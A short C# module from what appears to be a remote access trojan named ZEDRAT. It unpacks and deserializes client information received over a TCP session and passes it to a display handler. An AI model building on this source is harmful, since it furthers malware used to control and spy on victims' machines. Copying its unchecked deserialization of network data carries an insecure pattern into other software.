using System;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;

namespace ZEDRAT.Module
{
	public class ClientInfomation
	{
		public Action<TcpClientSession, GetCilentInfo> _FormExecute;

		~ClientInfomation()
		{
		}

		public void ClientInfoExecute(TcpClientSession tcs, byte[] bt)
		{
			object obj = Serializable.Deserialize(GZip.Decompress(bt));
			this._FormExecute(tcs, obj as GetCilentInfo);
		}

		public void destroy()
		{
			this._FormExecute = null;
		}
	}
}
